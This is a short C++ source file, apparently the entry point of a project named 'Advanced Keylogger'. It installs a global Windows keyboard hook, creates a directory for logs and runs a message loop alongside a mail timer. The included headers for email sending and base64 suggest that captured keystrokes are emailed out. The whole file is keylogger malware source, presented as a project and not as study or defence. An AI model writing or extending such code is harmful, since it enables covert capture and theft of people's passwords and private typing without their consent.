/*
* Project: Advanced Keylogger
* Author: Joseph Schell
* Date: 08/12/2018
* Sources:
*/
#include <iostream>
#include <windows.h>
#include "keyConstants.h"
#include "helper.h"
#include "base64.h"
#include "inputOutput.h"
#include "timer.h"
#include "sendEmail.h"
#include "keyboardHook.h"

using namespace std;

int main()
{
	MSG message;

	inputOutput::makeDir(inputOutput::getOurPath(true));

	installHook();

	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	MailTimer.stop();

	return 0;
}

